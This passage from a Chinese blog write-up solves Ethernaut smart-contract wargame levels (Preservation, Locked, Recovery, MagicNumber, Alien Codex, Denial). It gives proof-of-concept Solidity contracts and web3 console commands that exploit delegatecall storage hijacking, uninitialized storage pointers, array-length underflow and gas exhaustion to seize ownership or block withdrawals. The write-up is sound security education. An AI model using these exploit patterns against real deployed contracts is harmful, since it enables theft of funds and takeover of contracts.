<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract a &#123;</span><br><span class="line">    uint a1;</span><br><span class="line">    </span><br><span class="line">    function a0(address test) public &#123;</span><br><span class="line">        test.delegatecall(bytes4(keccak256(&quot;b0()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getA1() returns(uint) &#123;</span><br><span class="line">        return a1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract b &#123;</span><br><span class="line">    uint b1; </span><br><span class="line"></span><br><span class="line">    function b0() public &#123;</span><br><span class="line">        b1 = 1111;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getB1() public returns(uint) &#123;</span><br><span class="line">        return b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    在上述代码中，如果调用a0函数，看起来是在a0中调用合约b中的b0将b1的值修改为了1111，实际上分别调用getA1和getB1可以发现，被赋值1111的是a1而不是b1。这正是delegatecall调用其他合约中函数的特性，代码是在a合约的环境中执行的，操作的也是a合约的 storage 。</p>
<p>引用大佬分析：</p>
<blockquote>
<p>所以这个题就很好办了，我们调用<code>Preservation</code>的<code>setFirstTime</code>函数时候实际通过 delegatecall 执行了<code>LibraryContract</code>的<code>setTime</code>函数，修改了<code>timeZone1Library</code>变量。<br>这样，我们第一次调用<code>setFirstTime</code>将<code>timeZone1Library</code>变量修改为我们的恶意合约的地址，第二次调用<code>setFirstTime</code>就可以执行我们的任意代码了。</p>
</blockquote>
<p>Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract PreservationPoc &#123;</span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  </span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    owner = address(_time);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//修改为恶意合约地址</span><br><span class="line">await contract.setFirstTime(&quot;0xBF85F10dADb216Ca5093dF8238dE314d9BB7d407&quot;)</span><br><span class="line">//修改为自己的地址</span><br><span class="line">await contract.setFirstTime(&quot;0x2eb4081c419d1890eb0af97ce5a9689cad2fe3da&quot;)</span><br></pre></td></tr></table></figure>

<p>​    第一次调用setFirstTime是将恶意合约地址作为参数传给LiberayContract合约中setTime的参数，然后在setTime中将恶意合约地址赋给storedTime,由于delegatecall调用的特性，实际上恶意合约地址被赋给了timeZone1Library。然后第二次调用setFirstTime的时候，调用delegatecall的地址变成了恶意合约的地址，执行了恶意合约方法，将自己的地址赋值给了owner变量。</p>
<p>​    使用await contract.owner()查看合约拥有者，如果是自己地址，那么恭喜，你通关了。</p>
<p>大佬还有一句话：</p>
<blockquote>
<p> 函数中的局部变量默认为存储或内存，具体取决于其类型。未初始化的本地存储变量可以指向合约中的其他意外存储变量，从而导致故意（即开发人员故意将它们放在那里进行攻击）或无意的漏洞。 </p>
</blockquote>
<p>关键;</p>
<ul>
<li>delegatecall调用其他合约函数的特点</li>
<li>uint类型可以存储地址</li>
</ul>
<h2 id="Locked"><a href="#Locked" class="headerlink" title="Locked"></a>Locked</h2><p>通关条件：</p>
<ul>
<li>解锁registrar</li>
</ul>
<p>​    照旧贴大佬分析：</p>
<blockquote>
<p>为了讨论这个漏洞，首先我们需要了解存储（Storage）在 Solidity 中的工作方式。作为一个高度抽象的概述（没有任何适当的技术细节——我建议阅读 Solidity 文档以进行适当的审查），状态变量按它们出现在合约中的顺序存储在合约的 <em>Slot</em> 中（它们可以被组合在一起，但在本例中不可以，所以我们不用担心）。因此， <code>unlocked</code> 存在 <code>slot 0</code> 中， <code>registeredNameRecord</code> 存在 <code>slot 1</code> 中， <code>resolve</code> 在 <code>slot 2</code> 中，等等。这些 slot 的大小是 32 字节（映射会让事情更加复杂，但我们暂时忽略）。如果 <code>unlocked</code> 是 <code>false</code> ，其布尔值看起来会是 <code>0x000...0</code>（64 个 0，不包括 <code>0x</code> ）；如果是 <code>true</code> ，则其布尔值会是 <code>0x000...1</code> （63 个 0）。正如你所看到的，在这个特殊的例子中，存储上存在着很大的浪费。</p>
<p>我们需要的另一部分知识，是 Solidity 会在将复杂的数据类型，比如 <code>structs</code> ，初始化为局部变量时，默认使用 storage 来存储。因此，在 [16] 行中的 <code>newRecord</code> 默认为storage。合约的漏洞是由 <code>newRecord</code> 未初始化导致的。由于它默认为 storage，因此它成为指向 storage 的指针；并且由于它未初始化，它指向 slot 0（即 <code>unlocked</code> 的存储位置）。请注意，[17] 行和[18] 行中，我们将 <code>_name</code> 设为 <code>nameRecord.name</code> 、将 <code>_mappedAddress</code> 设为 <code>nameRecord.mappedAddress</code> 的操作，实际上改变了 slot 0 和 slot 1 的存储位置，也就是改变了 <code>unlocked</code> 和与 <code>registeredNameRecord</code> 相关联的 slot。</p>
<p>这意味着我们可以通过 <code>register()</code> 函数的 <code>bytes32 _name</code> 参数直接修改 <code>unlocked</code> 。因此，如果 <code>_name</code> 的最后一个字节为非零，它将修改 slot 0 的最后一个字节并直接将 <code>unlocked</code> 转为 <code>true</code> 。就在我们将 <code>unlocked</code> 设置为 <code>true</code> 之时，这样的 <code>_name</code> 值将传入 [23] 行的 <code>require()</code> 函数。在Remix中试试这个。注意如果你的 <code>_name</code> 使用下面形式，函数会通过： <code>0x0000000000000000000000000000000000000000000000000000000000000001</code></p>
</blockquote>
<p>Poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.23; </span><br><span class="line"></span><br><span class="line">// A Locked Name Registrar</span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool public unlocked = false;  // registrar locked, no name updates</span><br><span class="line">    </span><br><span class="line">    struct NameRecord &#123; // map hashes to addresses</span><br><span class="line">        bytes32 name; // </span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names </span><br><span class="line">    mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses</span><br><span class="line">    </span><br><span class="line">    function register(bytes32 _name, address _mappedAddress) public &#123;</span><br><span class="line">        // set up the new NameRecord</span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        require(unlocked); // only allow registrations if contract is unlocked</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LockedPoc &#123;</span><br><span class="line">    function hack(address target) public &#123;</span><br><span class="line">        Locked lock = Locked(target);</span><br><span class="line">        lock.register(bytes32(1),address(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    struct 初始化为局部变量时，默认使用 storage 来存储，它成为指向 storage 的指针；并且由于它未初始化，它指向 slot 0（即 <code>unlocked</code> 的存储位置） 。在其他文章看到的都是结论很少有完全解释清楚原理的，留个疑问，看以后能不能解决吧。</p>
<p>关键：</p>
<ul>
<li>存储在solidity的工作方式</li>
</ul>
<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>通关条件：</p>
<ul>
<li>从丢失的合同中找回0.5 ether</li>
</ul>
<p>​    由于区块链一切都是透明的，所以我们可以通过etherscan直接查询到丢失合约的地址。</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img5.png" alt="img5"></p>
<p>​    箭头所指就是新建的token合约地址，通过Remix的At address功能，我们可以直接操作已部署在链上的合约。</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img6.png" alt="img6"></p>
<p>​    通过destroy函数我们可以将合约自毁并将那0.5 ether取出。</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img4.png" alt="img4"></p>
<p>​    可以看到调用destroy后，合约自毁，并将余额全部转入我的钱包了。</p>
<p>​    在Remix中还可以通过部署合约来调用destroy来转出余额，这样的方式相比使用At Address要略显麻烦一些，不过也是一种方式。</p>
<p>Poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  // public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  function() public payable ;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public ;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address _to) public ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract RecoveryPoc &#123;</span><br><span class="line">    SimpleToken target;</span><br><span class="line">    constructor(address _addr) public&#123;</span><br><span class="line">        target = SimpleToken(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        target.destroy(tx.origin);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    还有一种更加麻烦的方式是自己计算合约地址，可以看这篇文章——<a href="https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3" target="_blank" rel="noopener">Ethernaut Lvl 18 Recovery Walkthrough: How to retrieve lost contract addresses (in 2 ways)</a>。</p>
<p>​     public a = address（keccak256（0xd6,0x94，YOUR_ADDR，0x01））</p>
<p>​    通关后还给出了一篇文章介绍了一种隐秘且危险的方式存储ether： <a href="https://swende.se/blog/Ethereum_quirks_and_vulns.html" target="_blank" rel="noopener">https://swende.se/blog/Ethereum_quirks_and_vulns.html</a> </p>
<p>关键：</p>
<ul>
<li>区块链上一切都是透明的</li>
<li>如何找回丢失的地址</li>
<li>selfdestroy的使用</li>
</ul>
<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><p>通关条件：</p>
<ul>
<li>使用正确的数字响应题目合约</li>
</ul>
<p>​    先放大佬的Poc吧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var bytecode = &quot;0x600a600c600039600a6000f3602A60805260206080f3&quot;;</span><br><span class="line">web3.eth.sendTransaction(&#123; from: player, data: bytecode &#125;, function(err,res)&#123;console.log(res)&#125;);</span><br><span class="line">await contract.setSolver(&quot;contract address&quot;);</span><br></pre></td></tr></table></figure>

<p>​    字节码的生成可以参考这篇文章：<a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2" target="_blank" rel="noopener">Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes</a></p>
<p>​    生命的意义： <a href="https://baike.baidu.com/item/42/16630643?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/42/16630643?fr=aladdin</a> </p>
<p>​    合约创建相关： <a href="https://www.jianshu.com/p/d9137e87c9d3" target="_blank" rel="noopener">https://www.jianshu.com/p/d9137e87c9d3</a> </p>
<p>​    接下来回到这道题吧，题目要求使用正确的数字响应合约。由题目代码可以初步判断返回数字应该是42，这个42的由来可以看上面生命的意义的百科，还有个要求是代码最多10个操作码，这个时候使用remix来部署合约就有点不现实了。我们可以使用web3.eth提供的sendTransaction来部署合约，for example：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// using the callback</span><br><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: &apos;0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe&apos;,</span><br><span class="line">    data: code // deploying a contract</span><br><span class="line">&#125;, function(error, hash)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>​    from的值在题目中可以由player代替，data的code需要看字节码生成那篇文章了，由于水平有限，我还不能理解T.T。不过有一点需要注意，那篇文章中所返回的是0x42并不是42，所以我们需要吧42修改为2A,即0x2A=42。</p>
<p>​    使用sendTransaction部署合约后，可以通过返回的交易哈希来获取合约地址，然后将contrant address替换为合约地址即可。</p>
<p>关键：</p>
<ul>
<li>生命的意义</li>
<li>使用opcode创建合约</li>
<li>web3.eth.sendTransaction的使用</li>
<li>EVM汇编</li>
</ul>
<h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><p>通关条件：</p>
<ul>
<li>声明合约所有权</li>
</ul>
<p>​     <a href="https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/ownership/Ownable.sol" target="_blank" rel="noopener"><code>Ownable.sol</code>源码传送门</a> </p>
<p>​    首先面对的问题是modifier contacted，所有函数都包含它，所以必须先是contact为true。</p>
<p>​    make_contact能够帮我们做到，唯一条件是传入一个长度大于2**200的数组，由于这里没有对数组内容进行检测，仅仅是检测了数组长度，所以我们可以伪造。</p>
<p>​    修改contactPoc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sig = web3.sha3(&quot;make_contact(bytes32[])&quot;).slice(0,10)</span><br><span class="line">// &quot;0x1d3d4c0b&quot;</span><br><span class="line">// 函数选择器</span><br><span class="line">data1 = &quot;0000000000000000000000000000000000000000000000000000000000000020&quot;</span><br><span class="line">// 除去函数选择器，数组长度的存储从第 0x20 位开始</span><br><span class="line">data2 = &quot;1000000000000000000000000000000000000000000000000000000000000001&quot;</span><br><span class="line">// 数组的长度</span><br><span class="line">await contract.contact()</span><br><span class="line">// false</span><br><span class="line">contract.sendTransaction(&#123;data: sig + data1 + data2&#125;);</span><br><span class="line">// 发送交易</span><br><span class="line">await contract.contact()</span><br><span class="line">// true</span><br></pre></td></tr></table></figure>

<p>​    solidity中计算存储位时使用公式为：<br>$$<br>keccak256(slot) + index<br>$$</p>
<blockquote>
<p>之后就是一个经典的 OOB (out of boundary) Attack</p>
<p>首先通过调用 <code>retract()</code>，使得 <code>codex</code> 数组长度下溢。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address, <span class="number">1</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;alert(y)&#125;);</span><br><span class="line"><span class="comment">// codex.length</span></span><br><span class="line"><span class="comment">// 0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line">contract.retract()</span><br><span class="line"><span class="comment">// codex.length--</span></span><br><span class="line"></span><br><span class="line">web3.eth.getStorageAt(contract.address, <span class="number">1</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;alert(y)&#125;);</span><br><span class="line"><span class="comment">// codex.length</span></span><br><span class="line"><span class="comment">// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还需要了解一些 Solidity 中各种变量的存储方式。<br>这里推荐知道创宇的一篇文章：<a href="https://www.freebuf.com/articles/blockchain-articles/177260.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/blockchain-articles/177260.html</a></p>
<p>可以简单将动态数组内变量的存储位计算方法概括为：<br><code>b[X] == SLOAD(keccak256(slot) + X)</code></p>
<p>在本题中，数组 codex 的 slot 为 1，同时也是存储数组长度的地方。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sha3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">bytes32</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>    <span class="keyword">return</span> binascii.unhexlify(<span class="string">'%064x'</span>%i)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sha3.keccak_256(bytes32(<span class="number">1</span>)).hexdigest()</span><br><span class="line"><span class="string">'b10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span>**<span class="number">256</span> - <span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span></span><br><span class="line"><span class="number">35707666377435648211887908874984608119992236509074197713628505308453184860938</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可计算出，<code>codex[35707666377435648211887908874984608119992236509074197713628505308453184860938]</code> 对应的存储位就是 slot 0。</p>
<p>之前提到 slot 0 中同时存储了 <code>contact</code> 和 <code>owner</code>，只需将 <code>owner</code> 替换为 player 地址即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await contract.owner()</span><br><span class="line">// &quot;0x73048cec9010e92c298b016966bde1cc47299df5&quot;</span><br><span class="line">contract.revise(&apos;35707666377435648211887908874984608119992236509074197713628505308453184860938&apos;,&apos;0x000000000000000000000001676ca875027fd9a5bdbd4f1f0380d8f34d8e1cdf&apos;)</span><br><span class="line">// 调用 revise()</span><br><span class="line">await contract.owner()</span><br><span class="line">// &quot;0x676ca875027fd9a5bdbd4f1f0380d8f34d8e1cdf&quot;</span><br><span class="line">// Submit instance</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>​    参考文档：</p>
<p><a href="https://xz.aliyun.com/t/2914" target="_blank" rel="noopener">ethernaut 题目Alien Codex write up</a>  </p>
<p><a href="http://mitah.cn/index.php/archives/14/" target="_blank" rel="noopener">Zeppelin Ethernaut writeup</a> </p>
<h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>通关条件：</p>
<ul>
<li>在调用withdraw的时候，禁止owner分走账户的1%余额。</li>
</ul>
<blockquote>
<p>address.call.value(x)() 可以向合约发送更多的gas</p>
<p>assert(0==1) 触发异常之后会消耗所有可用的 gas </p>
</blockquote>
<p>​    要使owner.transfer(amountToSend)执行失败，就需要使owner报错或者前面的语句将gas消耗完。很明显，在这里我们只能让前面的语句把gas消耗完来阻止owner提钱。</p>
<p>​    partner默认没有赋值，这正好给了我们利用途径。新建一个合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.22 &lt;0.6.0;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    function() payable&#123;</span><br><span class="line">        assert(0==1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    将partner赋值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract.setWithdrawPartner(&quot;0xD8Da635f4c5356942AbF3A1C67194E44C3F80a8f&quot;)</span><br></pre></td></tr></table></figure>

<p>​    然后调用withdraw()：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>

<p>​    这里就要小小回顾下，要阻止转账的成功，这里提到的有两个方式：</p>
<ul>
<li>在其调用转账代码之前将gas消耗完毕</li>
<li>转账目标主动抛出异常</li>
</ul>
<p>关键：</p>
<ul>
<li>assert()失败耗费所有gas</li>
</ul>
<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>​    404 Not found ╮(╯▽╰)╭我也想做，可是它是404啊！</p>
<p>​    做(chao)了好久好久好久，终于搞定了<del>~</del></p>
<p>​    完结撒花<em>★,°</em>:.☆(￣▽￣)/$:<em>.°★</em> 。</p>
<p>​    </p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Ethernaut</tag>
        <tag>WriteUp</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
</search>
